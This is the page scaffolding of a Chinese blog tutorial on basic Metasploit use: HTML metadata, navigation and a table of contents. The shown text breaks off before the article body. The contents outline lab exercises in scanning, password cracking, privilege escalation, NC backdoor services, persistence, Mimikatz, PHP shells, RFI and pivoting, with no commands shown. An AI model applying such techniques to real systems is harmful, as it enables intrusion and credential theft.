<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.0.2"><link rel="apple-touch-icon" sizes="180x180" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/images/01.jpg"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="h6ecMlAUCMDTIJmEha3N3mJmMydid5XY8AbS767rKtM"><meta name="baidu-site-verification" content="T0YB7GSdOB"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><script class="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"lunamoore.github.io",root:"/",scheme:"Muse",version:"8.0.0-rc.5",exturl:!0,sidebar:{position:"left",display:"post",padding:18,offset:12},copycode:!0,bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"fadeInDown",post_body:"fadeInDown",coll_header:"fadeInLeft",sidebar:"fadeInUp"}},prism:!1,path:"search.xml",localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1}}</script><meta name="description" content="0x01.写在前面 Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试及入侵检测系统]签名开发。metspolit框架共有四个版本（Metasploit Framework Edition，Metasploit Community Edition，Metasploit Express，Metasploit Pro），MSF为其中的开源免费版本，其他为收"><meta property="og:type" content="article"><meta property="og:title" content="MSF的简单操作"><meta property="og:url" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/index.html"><meta property="og:site_name" content="Lluna&#39;s Pure land."><meta property="og:description" content="0x01.写在前面 Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试及入侵检测系统]签名开发。metspolit框架共有四个版本（Metasploit Framework Edition，Metasploit Community Edition，Metasploit Express，Metasploit Pro），MSF为其中的开源免费版本，其他为收"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626115208454.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191334844.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191426746.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626133358053.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705201304290.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705202016725.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121725585.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121809730.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706141936093.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707152622464.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153518682.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153857414.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155315502.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155229810.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155813729.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707160150775.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707162846401.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707163857984.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707164742663.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707214348635.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221947516.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221620618.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222926242.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221906308.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707223402391.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222635457.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224245019.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224822057.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225206502.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225911526.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230006676.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230225787.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230115548.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709110800149.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150301191.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150337750.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150449642.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709161910259.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165542747.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165601746.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200711150428027.png"><meta property="article:published_time" content="2020-08-18T07:47:41.000Z"><meta property="article:modified_time" content="2020-08-18T10:27:30.144Z"><meta property="article:author" content="Lluna"><meta property="article:tag" content="security tools"><meta property="article:tag" content="linux"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626115208454.png"><link rel="canonical" href="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/"><script class="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><title>MSF的简单操作 | Lluna's Pure land.</title><noscript><style>body{margin-top:2rem}.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header,.use-motion .sidebar{visibility:visible}.use-motion .footer,.use-motion .header,.use-motion .site-brand-container .toggle{opacity:initial}.use-motion .custom-logo-image,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line{transform:scaleX(1)}.search-pop-overlay,.sidebar-nav{display:none}.sidebar-panel{display:block}</style></noscript><link rel="alternate" href="/atom.xml" title="Lluna's Pure land." type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><div class="headband"></div><main class="main"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><i class="logo-line"></i><h1 class="site-title">Lluna's Pure land.</h1><i class="logo-line"></i></a><p class="site-subtitle" itemprop="description">What is life like when singing to wine?</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home // 首页 fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user // 关于 fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags // 标签 fa-fw"></i>标签<span class="badge">12</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th // 分类 fa-fw"></i>分类<span class="badge">16</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive // 归档 fa-fw"></i>归档<span class="badge">40</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar //日程表 fa-fw"></i>日程表</a></li><li class="menu-item menu-item-movies"><a href="/movies" rel="section"><i class="fa fa-film // 电影 fa-fw"></i>电影</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div class="search-result-container"><div class="no-result"><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div><aside class="sidebar"><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class="sidebar-nav"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><section class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">0x01.写在前面</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81MSF5%E7%9A%847%E5%A4%A7%E6%A8%A1%E5%9D%97"><span class="nav-number">1.1.</span> <span class="nav-text">一、MSF5的7大模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-auxiliary"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.auxiliary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-exploits"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.exploits</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-payloads"><span class="nav-number">1.1.3.</span> <span class="nav-text">3.payloads</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-encoders"><span class="nav-number">1.1.4.</span> <span class="nav-text">4.encoders</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-nops"><span class="nav-number">1.1.5.</span> <span class="nav-text">5.nops</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-post"><span class="nav-number">1.1.6.</span> <span class="nav-text">6.post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-evasion"><span class="nav-number">1.1.7.</span> <span class="nav-text">7.evasion</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81msfconsole%E6%8E%A7%E5%88%B6%E5%8F%B0"><span class="nav-number">1.2.</span> <span class="nav-text">二、msfconsole控制台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E9%AA%8C%E6%A1%88%E4%BE%8B"><span class="nav-number">1.3.</span> <span class="nav-text">三、实验案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-active-exploit%E4%B8%8EPassiveMoudle%E6%A1%88%E4%BE%8B"><span class="nav-number">1.3.1.</span> <span class="nav-text">(1)active exploit与PassiveMoudle案例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E7%94%9F%E6%88%90payload%E6%A1%88%E4%BE%8B"><span class="nav-number">1.3.2.</span> <span class="nav-text">（2）生成payload案例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81meterpreter%EF%BC%8C%E6%B3%A8%E5%85%A5%E5%88%B0%E5%90%88%E6%B3%95%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%87%8C%E7%9A%84%E8%BF%9B%E7%A8%8B%EF%BC%8C%E9%9A%8F%E6%9C%BA%E3%80%82"><span class="nav-number">1.4.</span> <span class="nav-text">四、meterpreter，注入到合法的操作系统里的进程，随机。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81-msfcli"><span class="nav-number">1.5.</span> <span class="nav-text">五、 msfcli</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-MSF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">0x02.MSF信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%86%85%E7%BD%AE%E5%A4%96%E9%83%A8%E5%B7%A5%E5%85%B7"><span class="nav-number">2.1.</span> <span class="nav-text">一、内置外部工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81auxiliary%E6%A8%A1%E5%9D%97"><span class="nav-number">2.2.</span> <span class="nav-text">二、auxiliary模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E4%B8%80%EF%BC%8Carp%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.1.</span> <span class="nav-text">例一，arp主机扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E4%BA%8C%EF%BC%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.2.</span> <span class="nav-text">例二，端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E4%B8%89%EF%BC%8CUDP%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.3.</span> <span class="nav-text">例三，UDP扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%9B%9B%EF%BC%8CSMTP%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.4.</span> <span class="nav-text">例四，SMTP扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E4%BA%94%EF%BC%8CSMB%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.5.</span> <span class="nav-text">例五，SMB扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%85%AD%EF%BC%8CSSH%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.6.</span> <span class="nav-text">例六，SSH扫描</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-MSF%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="nav-number">3.</span> <span class="nav-text">0x03.MSF漏洞扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%A1%88%E4%BE%8B"><span class="nav-number">3.1.</span> <span class="nav-text">实验案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E4%B8%80%EF%BC%8Cvnc%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="nav-number">3.1.1.</span> <span class="nav-text">例一，vnc密码破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E4%BA%8C%EF%BC%8Cvnc%E6%97%A0%E5%AF%86%E7%A0%81%E8%AE%BF%E9%97%AE"><span class="nav-number">3.1.2.</span> <span class="nav-text">例二，vnc无密码访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E4%B8%89%EF%BC%8CRDP%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.1.3.</span> <span class="nav-text">例三，RDP远程桌面漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%9B%9B%EF%BC%8C%E6%98%BE%E7%A4%BA%E7%9B%AE%E5%BD%95%E5%8F%8A%E6%96%87%E4%BB%B6"><span class="nav-number">3.1.4.</span> <span class="nav-text">例四，显示目录及文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E4%BA%94%EF%BC%8CWebDAV-Unicode%E7%BC%96%E7%A0%81%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="nav-number">3.1.5.</span> <span class="nav-text">例五，WebDAV Unicode编码身份验证绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%85%AD%EF%BC%8Cwmap"><span class="nav-number">3.1.6.</span> <span class="nav-text">例六，wmap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-MSF%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">0x04.MSF客户端渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%A1%88%E4%BE%8B-1"><span class="nav-number">4.1.</span> <span class="nav-text">实验案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B1"><span class="nav-number">4.1.1.</span> <span class="nav-text">案例1</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">5.</span> <span class="nav-text">0x05.后渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%A1%88%E4%BE%8B-2"><span class="nav-number">5.1.</span> <span class="nav-text">实验案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%EF%BC%8C%E6%A1%88%E4%BE%8B%E4%B8%80"><span class="nav-number">5.1.1.</span> <span class="nav-text">提权，案例一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B7%BB%E5%8A%A0NC%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1"><span class="nav-number">5.1.2.</span> <span class="nav-text">案例二，使用注册表添加NC后门服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%89%E3%80%81%E6%8A%93%E5%8C%85"><span class="nav-number">5.1.3.</span> <span class="nav-text">案例三、抓包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E5%9B%9B%E3%80%81%E6%96%87%E4%BB%B6%E6%90%9C%E7%B4%A2"><span class="nav-number">5.1.4.</span> <span class="nav-text">案例四、文件搜索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%BA%94%E3%80%81%E6%97%B6%E9%97%B4%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90"><span class="nav-number">5.1.5.</span> <span class="nav-text">案例五、时间取证分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E5%85%AD%E3%80%81%E4%BD%BF%E7%94%A8Pivoting%EF%BC%88%E5%9F%BA%E4%BA%8E%E8%B7%AF%E7%94%B1%EF%BC%89%E5%AE%9E%E7%8E%B0%E8%B7%B3%E6%9D%BF-%E6%9E%A2%E7%BA%BD-%E6%94%AF%E7%82%B9get-shell"><span class="nav-number">5.1.6.</span> <span class="nav-text">案例六、使用Pivoting（基于路由）实现跳板&#x2F;枢纽&#x2F;支点get shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%AE%9E%E9%AA%8C%E6%8B%93%E6%89%91"><span class="nav-number">5.1.6.1.</span> <span class="nav-text">1.实验拓扑</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="nav-number">5.1.6.2.</span> <span class="nav-text">2.实验目的</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="nav-number">5.1.6.3.</span> <span class="nav-text">3.实验过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%83%E3%80%81%E4%BD%BF%E7%94%A8Pivoting%EF%BC%88%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%89%E5%AE%9E%E7%8E%B0%E8%B7%B3%E6%9D%BF-%E6%9E%A2%E7%BA%BD-%E6%94%AF%E7%82%B9get-shell"><span class="nav-number">5.1.7.</span> <span class="nav-text">案例七、使用Pivoting（基于端口转发）实现跳板&#x2F;枢纽&#x2F;支点get shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E5%85%AB%EF%BC%8C%E5%A4%9Asessions%E8%BF%9E%E6%8E%A5"><span class="nav-number">5.1.8.</span> <span class="nav-text">案例八，多sessions连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%B9%9D%EF%BC%8C%E5%BB%BA%E7%AB%8B%E6%8C%81%E4%B9%85%E8%BF%9E%E6%8E%A5"><span class="nav-number">5.1.9.</span> <span class="nav-text">案例九，建立持久连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E5%8D%81%EF%BC%8CMSF%E5%BB%B6%E5%B1%95Mimikatz"><span class="nav-number">5.1.10.</span> <span class="nav-text">案例十，MSF延展Mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E5%8D%81%E4%B8%80%EF%BC%8CPHP-shell"><span class="nav-number">5.1.11.</span> <span class="nav-text">案例十一，PHP shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E5%8D%81%E4%BA%8C%EF%BC%8CRFI"><span class="nav-number">5.1.12.</span> <span class="nav-text">案例十二，RFI</span></a></li></ol></li></ol></li></ol></div></section><section class="site-overview-wrap sidebar-panel"><div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="Lluna" src="/images/01.jpg"><p class="site-author-name" itemprop="name">Lluna</p><div class="site-description" itemprop="description">A primary school student in the field of Cyberspace Security!</div></div><div class="site-state-wrap animated"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">40</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">16</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">12</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author animated"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZQ==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lunamoore"><i class="fab fa-github fa-fw"></i></span> </span><span class="links-of-author-item"><span class="exturl" data-url="bWFpbHRvOmppeWViYWxhYmFsYUAxMjYuY29t" title="E-Mail → mailto:jiyebalabala@126.com"><i class="fa fa-envelope fa-fw"></i></span></span></div><div class="cc-license animated" itemprop="license"><span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span></div><div class="links-of-blogroll animated"><div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i> 友链</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cHM6Ly92YWxlY2FzZWMuZ2l0aHViLmlv" title="https:&#x2F;&#x2F;valecasec.github.io">valecalida's house</span></li></ul></div></section></div></aside><div class="sidebar-dimmer"></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><div class="reading-progress-bar"></div><span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZS8=" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 